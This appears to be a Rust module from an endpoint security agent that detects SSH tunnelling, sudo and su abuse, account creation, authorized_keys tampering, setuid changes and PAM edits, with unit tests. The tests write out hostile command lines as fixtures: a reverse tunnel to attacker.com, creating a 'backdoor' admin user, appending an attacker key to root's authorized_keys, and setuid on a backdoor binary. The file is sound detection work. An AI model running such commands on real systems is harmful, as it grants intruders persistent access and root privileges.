/// Lateral Movement and Privilege Escalation Detection — Tranche 3 Upgrade 1
///
/// Detects SSH tunneling, sudo abuse, su chains, user account manipulation,
/// authorized_keys tampering, setuid abuse, and PAM config modification.
///
/// MITRE coverage:
///   T1021.004 — Remote Services: SSH
///   T1572 — Protocol Tunneling
///   T1548.001 — Abuse Elevation Control Mechanism: Setuid
///   T1548.003 — Abuse Elevation Control Mechanism: Sudo
///   T1548 — Abuse Elevation Control Mechanism
///   T1098 — Account Manipulation
///   T1098.004 — Account Manipulation: SSH Authorized Keys
///   T1136.001 — Create Account: Local Account
///   T1556.003 — Modify Authentication Process: PAM
use crate::models::{AlertSeverity, ProcessInfo, TelemetryEvent};
use chrono::DateTime;
use chrono::Utc;
use serde_json::json;
use std::path::Path;

/// Build a lateral movement alert TelemetryEvent.
fn lateral_alert(
    now: DateTime<Utc>,
    event_type: &str,
    mitre: &str,
    severity: AlertSeverity,
    reason: &str,
    process: &ProcessInfo,
    trigger: &str,
) -> TelemetryEvent {
    TelemetryEvent::new(
        now,
        event_type,
        "core-agent/lateral-movement",
        json!({
            "severity": severity.as_str(),
            "score": severity.score(),
            "category": "lateral_movement",
            "reason": reason,
            "details": {
                "pid": process.pid,
                "ppid": process.ppid,
                "command": process.command,
                "args": process.args,
                "process_kind": process.process_kind,
                "parent_command": process.parent_command,
                "parent_process_kind": process.parent_process_kind,
                "trigger": trigger,
                "mitre_technique": mitre,
                "confidence": "high",
            }
        }),
    )
}

/// Detect lateral movement and privilege escalation patterns from a ProcessInfo.
/// Returns any alert events produced.
pub fn detect_lateral_movement(process: &ProcessInfo, now: DateTime<Utc>) -> Vec<TelemetryEvent> {
    let mut alerts = Vec::new();

    let cmd_basename = Path::new(&process.command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("")
        .to_ascii_lowercase();
    let args_lower = process.args.to_ascii_lowercase();
    let parent_kind = process.parent_process_kind.as_deref().unwrap_or("");

    // ── SSH lateral movement patterns ─────────────────────────────────────────

    let is_ssh = cmd_basename == "ssh" && !process.command.contains("sshd");

    if is_ssh {
        // SSH with StrictHostKeyChecking=no — automated, scripted lateral movement
        if args_lower.contains("stricthostkeychecking=no") {
            alerts.push(lateral_alert(
                now,
                "alert_ssh_strict_host_bypass",
                "T1021.004",
                AlertSeverity::High,
                "SSH connecting with StrictHostKeyChecking disabled — automated lateral movement",
                process,
                "ssh_strict_host_bypass",
            ));
        }

        // BatchMode=yes — no user interaction, scripted pivoting
        if args_lower.contains("batchmode=yes") {
            alerts.push(lateral_alert(
                now,
                "alert_ssh_batch_mode",
                "T1021.004",
                AlertSeverity::Medium,
                "SSH running in batch mode — scripted lateral movement indicator",
                process,
                "ssh_batch_mode",
            ));
        }

        // ProxyCommand — tunneling through intermediate hosts
        if args_lower.contains("proxycommand") {
            alerts.push(lateral_alert(
                now,
                "alert_ssh_proxy_command",
                "T1021.004",
                AlertSeverity::High,
                "SSH ProxyCommand used — possible host pivoting or tunneling",
                process,
                "ssh_proxy_command",
            ));
        }

        // Reverse tunnel (-R) — attacker establishing persistent inbound backdoor
        if args_lower.contains(" -r ") || args_lower.starts_with("-r ") {
            alerts.push(lateral_alert(
                now,
                "alert_ssh_reverse_tunnel",
                "T1572",
                AlertSeverity::Critical,
                "SSH reverse tunnel (-R) — attacker creating persistent inbound backdoor",
                process,
                "ssh_reverse_tunnel",
            ));
        }

        // SOCKS proxy (-D) — all traffic tunneled through attacker-controlled host
        if args_lower.contains(" -d ") || args_lower.starts_with("-d ") {
            // Suppress: -d flag alone is common enough — only fire from interpreter chain
            if parent_kind == "interpreter" || parent_kind == "unknown" {
                alerts.push(lateral_alert(
                    now,
                    "alert_ssh_socks_proxy",
                    "T1572",
                    AlertSeverity::High,
                    "SSH SOCKS proxy (-D) from interpreter chain — network traffic being tunneled",
                    process,
                    "ssh_socks_proxy",
                ));
            }
        }
    }

    // ── sudo abuse patterns ───────────────────────────────────────────────────

    if cmd_basename == "sudo" {
        // sudo -l — listing sudo permissions (privilege recon)
        if args_lower.trim_end() == "-l" || args_lower.starts_with("-l ") || args_lower.contains(" -l ") {
            // Only alert if parent is interpreter/unknown (scripted) — suppress interactive terminal use
            let parent_cmd = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
            let is_interactive_terminal = parent_cmd.contains("terminal")
                || parent_cmd.contains("iterm")
                || parent_cmd.contains("cursor");
            if !is_interactive_terminal {
                alerts.push(lateral_alert(
                    now,
                    "alert_sudo_enumeration",
                    "T1548.003",
                    AlertSeverity::Low,
                    "sudo -l executed — attacker enumerating sudo permissions",
                    process,
                    "sudo_enum",
                ));
            }
        }

        // sudo spawning a shell (getting root shell)
        if args_lower.contains("bash") || args_lower.contains(" sh") || args_lower.contains("zsh")
            || args_lower.contains(" su") || args_lower.trim_start().starts_with("su")
        {
            // Only flag shell escalation when not clearly interactive developer context
            let parent_cmd = process.parent_command.as_deref().unwrap_or("").to_ascii_lowercase();
            let is_interactive = parent_cmd.contains("terminal") || parent_cmd.contains("iterm");
            if !is_interactive {
                alerts.push(lateral_alert(
                    now,
                    "alert_sudo_shell_escalation",
                    "T1548.003",
                    AlertSeverity::High,
                    "sudo spawning a shell — privilege escalation to root",
                    process,
                    "sudo_shell_escalation",
                ));
            }
        }

        // sudo -E (preserve environment) — can bypass env restrictions to escalate
        if args_lower.contains(" -e ") || args_lower.starts_with("-e ") {
            if parent_kind == "interpreter" || parent_kind == "unknown" {
                alerts.push(lateral_alert(
                    now,
                    "alert_sudo_env_preservation",
                    "T1548.003",
                    AlertSeverity::Medium,
                    "sudo -E preserving environment from interpreter chain — possible restriction bypass",
                    process,
                    "sudo_env_preserve",
                ));
            }
        }
    }

    // ── su chain from interpreter ─────────────────────────────────────────────

    if cmd_basename == "su" && (parent_kind == "interpreter" || parent_kind == "unknown") {
        alerts.push(lateral_alert(
            now,
            "alert_su_from_interpreter",
            "T1548",
            AlertSeverity::High,
            "su invoked from interpreter chain — privilege escalation attempt",
            process,
            "su_from_interpreter",
        ));
    }

    // ── User account creation and privilege modification ──────────────────────

    if cmd_basename == "dscl" {
        // Creating a new user account
        if args_lower.contains("create") && args_lower.contains("/users/") {
            alerts.push(lateral_alert(
                now,
                "alert_user_account_created",
                "T1136.001",
                AlertSeverity::Critical,
                "New user account created via dscl — persistence or privilege escalation",
                process,
                "dscl_create_user",
            ));
        }

        // Adding a user to the admin group
        if (args_lower.contains("append") || args_lower.contains("-merge"))
            && args_lower.contains("admin")
        {
            alerts.push(lateral_alert(
                now,
                "alert_user_added_to_admin",
                "T1098",
                AlertSeverity::Critical,
                "User added to admin group via dscl — privilege escalation",
                process,
                "dscl_add_to_admin",
            ));
        }
    }

    // sysadminctl for user management (supplement to detect_account_manipulation)
    if cmd_basename == "sysadminctl"
        && (args_lower.contains("-adduser") || (args_lower.contains("-admin") && !args_lower.contains("-admin ")))
    {
        alerts.push(lateral_alert(
            now,
            "alert_sysadminctl_user_modification",
            "T1136.001",
            AlertSeverity::High,
            "sysadminctl modifying user accounts or granting admin",
            process,
            "sysadminctl_user",
        ));
    }

    // ── Authorized keys tampering — SSH backdoor installation ─────────────────

    if args_lower.contains("authorized_keys")
        && (cmd_basename == "echo"
            || cmd_basename == "tee"
            || cmd_basename == "cp"
            || cmd_basename == "mv"
            || cmd_basename == "install")
    {
        alerts.push(lateral_alert(
            now,
            "alert_authorized_keys_write",
            "T1098.004",
            AlertSeverity::Critical,
            "Writing to authorized_keys — SSH backdoor installation",
            process,
            "authorized_keys_write",
        ));
    }

    // ── setuid/setgid manipulation ────────────────────────────────────────────

    if cmd_basename == "chmod"
        && (args_lower.contains("+s")
            || args_lower.contains("4755")
            || args_lower.contains("4775")
            || args_lower.contains("2755")
            || args_lower.contains("6755"))
        && (parent_kind == "interpreter" || parent_kind == "unknown"
            || process.behavior.references_downloads_path)
    {
        alerts.push(lateral_alert(
            now,
            "alert_setuid_modification",
            "T1548.001",
            AlertSeverity::High,
            "setuid/setgid bit set on file from interpreter chain — privilege escalation vector",
            process,
            "setuid_modification",
        ));
    }

    // ── PAM configuration modification ───────────────────────────────────────

    if args_lower.contains("/etc/pam.d/")
        && (cmd_basename == "vi"
            || cmd_basename == "vim"
            || cmd_basename == "nano"
            || cmd_basename == "echo"
            || cmd_basename == "tee"
            || cmd_basename == "sed")
    {
        alerts.push(lateral_alert(
            now,
            "alert_pam_config_modification",
            "T1556.003",
            AlertSeverity::Critical,
            "PAM configuration file modified — authentication bypass possible",
            process,
            "pam_config_write",
        ));
    }

    alerts
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::command_features::extract_features;
    use crate::classify::classify_path;
    use chrono::Utc;

    fn make_process(
        command: &str,
        args: &str,
        process_kind: &str,
        parent_kind: Option<&str>,
        parent_command: Option<&str>,
    ) -> ProcessInfo {
        ProcessInfo {
            pid: 1000,
            ppid: 500,
            command: command.to_string(),
            args: args.to_string(),
            process_kind: process_kind.to_string(),
            command_path_kind: classify_path(command),
            parent_command: parent_command.map(|s| s.to_string()),
            parent_args: None,
            parent_process_kind: parent_kind.map(|s| s.to_string()),
            parent_command_path_kind: None,
            behavior: extract_features(command, args),
        }
    }

    #[test]
    fn ssh_strict_host_bypass_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/ssh",
            "-o StrictHostKeyChecking=no user@attacker.com",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_ssh_strict_host_bypass"),
            "SSH with StrictHostKeyChecking=no should fire"
        );
    }

    #[test]
    fn ssh_reverse_tunnel_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/ssh",
            "-R 4444:localhost:22 user@attacker.com",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_ssh_reverse_tunnel"),
            "SSH -R reverse tunnel should fire"
        );
    }

    #[test]
    fn sudo_shell_escalation_fires_from_interpreter() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/sudo",
            "bash -i",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/python3"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_sudo_shell_escalation"),
            "sudo bash from interpreter should fire shell escalation"
        );
    }

    #[test]
    fn dscl_user_creation_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/dscl",
            ". -create /Users/backdoor",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_user_account_created"),
            "dscl -create /Users/ should fire user account creation"
        );
    }

    #[test]
    fn dscl_add_to_admin_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/dscl",
            ". -append /Groups/admin GroupMembership backdoor",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_user_added_to_admin"),
            "dscl -append admin group should fire"
        );
    }

    #[test]
    fn authorized_keys_write_fires() {
        let now = Utc::now();
        let p = make_process(
            "/bin/echo",
            "ssh-rsa AAAAB3N... attacker@evil >> /root/.ssh/authorized_keys",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_authorized_keys_write"),
            "echo to authorized_keys should fire"
        );
    }

    #[test]
    fn setuid_modification_fires_from_interpreter() {
        let now = Utc::now();
        let mut p = make_process(
            "/bin/chmod",
            "+s /usr/local/bin/backdoor",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        p.parent_process_kind = Some("interpreter".to_string());
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_setuid_modification"),
            "chmod +s from interpreter chain should fire setuid alert"
        );
    }

    #[test]
    fn pam_config_modification_fires() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/tee",
            "/etc/pam.d/sudo",
            "user_app",
            Some("interpreter"),
            Some("/usr/bin/bash"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.iter().any(|e| e.event_type == "alert_pam_config_modification"),
            "tee to /etc/pam.d/ should fire PAM modification alert"
        );
    }

    #[test]
    fn normal_ssh_does_not_fire() {
        let now = Utc::now();
        let p = make_process(
            "/usr/bin/ssh",
            "user@server.example.com",
            "user_app",
            Some("user_app"),
            Some("/Applications/Terminal.app/Contents/MacOS/Terminal"),
        );
        let alerts = detect_lateral_movement(&p, now);
        assert!(
            alerts.is_empty(),
            "Normal interactive SSH should not fire any lateral movement alerts"
        );
    }
}
